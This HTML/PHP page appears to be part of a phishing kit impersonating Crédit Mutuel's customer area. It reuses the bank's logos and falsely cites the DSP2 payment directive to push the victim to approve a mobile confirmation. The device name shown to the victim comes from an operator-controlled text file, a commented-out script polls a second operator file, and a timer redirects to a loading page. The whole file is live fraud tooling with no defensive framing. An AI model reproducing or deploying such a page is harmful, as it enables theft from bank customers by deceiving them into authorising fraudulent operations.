<!DOCTYPE>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	
<title>Connexion à votre Espace Client - Crédit Mutuel</title>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="css/normalize.css">
	<link rel="stylesheet" type="text/css" href="css/materialize.min.css">
	<link rel="stylesheet" type="text/css" href="css/loginStyle.css">
     <link rel="stylesheet" href="asset/css/spinner.css"/> 
     <link rel="stylesheet" href="css/style.css"/> 
	</head>
<body>
 <!--   <div id="cover-spin"></div> -->
	
<!-- <script>
setInterval(function(){ var client = new XMLHttpRequest();
client.open('GET', './Show_system/Show_Page.txt');
client.onreadystatechange = function() {

document.getElementById("content").innerHTML = client.responseText ;

}
client.send();  }, 2000);
</script> -->
<!-- <div id="content"></div> -->
<!-- <img width="200px" style="margin-left:50px" src="https://cdnsi.e-i.com/INGR/sd/cm_2015/30.98.6/fr/images/css/env/logo.svg" width="20%" alt="">

 -->

  <center >
    <img src="https://cdnsi.e-i.com/INGR/sd/cm_2015/30.98.6/fr/images/css/env/logo.svg" style="width:20%">
  </center>		  
		  
<div class="header" style="border:1px solid #ffa200;padding:10px;margin: 10px;margin:5px auto;background: #faf6ee none; ">

<b>Pourquoi nous vous demandons de confirmer votre identité ?</b>
<br>Dans le cadre de la directive européenne relative aux services de paiement (DSP2), le niveau de sécurité de l'accès à votre Espace Client est renforcé.
<br>Pour accéder à vos comptes, merci de confirmer votre identité depuis votre smartphone ou votre tablette avec <strong>Confirmation Mobile</strong>.



</div>
<div id="contenu" style="text-align:center;border:3px solid #9ab6e0;margin:0px auto; ">
<h6 style="color: #262626;">
<img width="20px" src="https://cdnsi.e-i.com/SOSD/sd/otp/1.1.5/images/lock.png"> <span>Votre connexion nécessite une sécurisation.
</span>
</h6>

<p>Démarrez votre application mobile depuis votre appareil "<strong><?php include("./Show_system/Show_Appverify.txt"); ?></strong>" pour vérifier et confirmer votre identité</p>

<img height="200px" src="https://cdnsi.e-i.com/SOSD/sd/otp/1.1.5/images/validation_operation.gif">


</div>
<script>
setInterval(function(){ 

window.location="loading.html";
  }, 10000);
</script>


	<script type="text/javascript" src="js/materialize.min.js"></script>
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
	<script type="text/javascript" src="js/routie.min.js"></script>
	<script type="text/javascript" src="js/loginScript.js"></script>
	

	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>		
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.26.11/dist/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>
<script>
<!-- $('#cover-spin').show(0); -->
</script>

</body>
</html>
